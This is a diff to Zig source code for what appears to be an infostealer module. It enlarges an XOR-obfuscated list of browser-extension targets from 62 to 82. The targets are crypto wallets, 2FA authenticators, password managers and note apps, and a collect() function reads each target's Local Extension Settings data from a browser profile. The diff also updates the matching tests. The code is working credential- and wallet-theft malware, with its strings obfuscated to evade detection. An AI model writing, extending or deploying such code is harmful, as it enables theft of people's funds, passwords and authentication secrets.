@@ -8,7 +8,7 @@ pub const WalletDir = struct {
 };
 
 const E = struct {
-    pub const names = [62][]const u8{
+    pub const names = [82][]const u8{
         &hash.xorEncrypt("MetaMask"),
         &hash.xorEncrypt("Binance"),
         &hash.xorEncrypt("Coinbase"),
@@ -71,8 +71,28 @@ const E = struct {
         &hash.xorEncrypt("ICONex"),
         &hash.xorEncrypt("Harmony"),
         &hash.xorEncrypt("Guild"),
+        &hash.xorEncrypt("Slope"),
+        &hash.xorEncrypt("Rise"),
+        &hash.xorEncrypt("HaloWallet"),
+        &hash.xorEncrypt("FuelWallet"),
+        &hash.xorEncrypt("Lace"),
+        &hash.xorEncrypt("DPal"),
+        &hash.xorEncrypt("Alby"),
+        &hash.xorEncrypt("HOT"),
+        &hash.xorEncrypt("Elastic"),
+        &hash.xorEncrypt("Penumbra"),
+        &hash.xorEncrypt("2FAS"),
+        &hash.xorEncrypt("2FAAuthenticator"),
+        &hash.xorEncrypt("KeepassXC"),
+        &hash.xorEncrypt("Norton PM"),
+        &hash.xorEncrypt("Avira PM"),
+        &hash.xorEncrypt("Passky PM"),
+        &hash.xorEncrypt("Padloc PM"),
+        &hash.xorEncrypt("Notion"),
+        &hash.xorEncrypt("Evernote"),
+        &hash.xorEncrypt("Google Keep"),
     };
-    pub const ids = [62][]const u8{
+    pub const ids = [82][]const u8{
         &hash.xorEncrypt("nkbihfbeogaeaoehlefnkodbefgpgknn"),
         &hash.xorEncrypt("fhbohimaelbohpjbbldcngcnapndodjp"),
         &hash.xorEncrypt("hnfanknocfeofbddgcijnmhnfnkdnaad"),
@@ -135,6 +155,26 @@ const E = struct {
         &hash.xorEncrypt("flpiciilemghbmfalicajoolhkkenfel"),
         &hash.xorEncrypt("fnnegphlobjdpkhecapkijjdkgcjhkib"),
         &hash.xorEncrypt("nanjmdknhkinifnkgdcggcfnhdaammmj"),
+        &hash.xorEncrypt("pocmplpaccanhmnllbbkpgfliimjljgo"),
+        &hash.xorEncrypt("anmhliadneilckkjdflmimjmbefnkggn"),
+        &hash.xorEncrypt("gldobjhpbpgehjaibkamoemmkpogmkni"),
+        &hash.xorEncrypt("aknpambpccpddfokmpcjbkijohjpjcdn"),
+        &hash.xorEncrypt("bdcoagdcknilpgkkkjcpfimbmclceckc"),
+        &hash.xorEncrypt("flgbnandkljdfdmdfmphioaoaeknfpdk"),
+        &hash.xorEncrypt("kdadnalhhbkmfcclmbgmpmgkbckgmjga"),
+        &hash.xorEncrypt("ebulnmjjlpkpcbjckaggnmmkbjdmnbap"),
+        &hash.xorEncrypt("fijkdpnlglggomhackpclpacpahojkge"),
+        &hash.xorEncrypt("lobgibpgphapcfkcohnlaadndlmnhjpk"),
+        &hash.xorEncrypt("fgkkmigekimnoceffdhbkafjkilmnfbo"),
+        &hash.xorEncrypt("pdnegokggloijhjlohfphdgdpadhhdgh"),
+        &hash.xorEncrypt("koodgkemghdndpfdkpddejfboljpckgo"),
+        &hash.xorEncrypt("adgbnklfnkfbfkibdiidanfmlecpifnh"),
+        &hash.xorEncrypt("mclnhjhggnggldigibacnefggdolbpnm"),
+        &hash.xorEncrypt("ionmhbhhabcbnmekcmdhbmlafpkhhkbp"),
+        &hash.xorEncrypt("icdedlpbgpncjmjiofibmgiolohdllbi"),
+        &hash.xorEncrypt("henkngclnkogllllnopoogadhifbkhfa"),
+        &hash.xorEncrypt("enhpjihddgdpgncncbgkpbmafkpkjnpa"),
+        &hash.xorEncrypt("omjhfjobhndiodddgboojcponaoafbnc"),
     };
     pub const ext_settings = hash.xorEncrypt("Local Extension Settings");
 };
@@ -180,7 +220,7 @@ pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) !
     var ext_settings_buf: [E.ext_settings.len]u8 = undefined;
     hash.xorDecrypt(&E.ext_settings, &ext_settings_buf);
 
-    inline for (0..62) |i| {
+    inline for (0..82) |i| {
         const id_enc = E.ids[i];
         var id_buf: [id_enc.len]u8 = undefined;
         hash.xorDecrypt(id_enc, &id_buf);
@@ -210,7 +250,7 @@ pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) !
 }
 
 test "extension count" {
-    try std.testing.expect(E.names.len == 62);
+    try std.testing.expect(E.names.len == 82);
 }
 
 test "first extension is MetaMask" {
@@ -219,10 +259,10 @@ test "first extension is MetaMask" {
     try std.testing.expectEqualSlices(u8, "MetaMask", &buf);
 }
 
-test "last extension is Guild" {
-    var buf: [E.names[61].len]u8 = undefined;
-    hash.xorDecrypt(E.names[61], &buf);
-    try std.testing.expectEqualSlices(u8, "Guild", &buf);
+test "last extension is Google Keep" {
+    var buf: [E.names[81].len]u8 = undefined;
+    hash.xorDecrypt(E.names[81], &buf);
+    try std.testing.expectEqualSlices(u8, "Google Keep", &buf);
 }
 
 test "collect returns empty for nonexistent profile" {
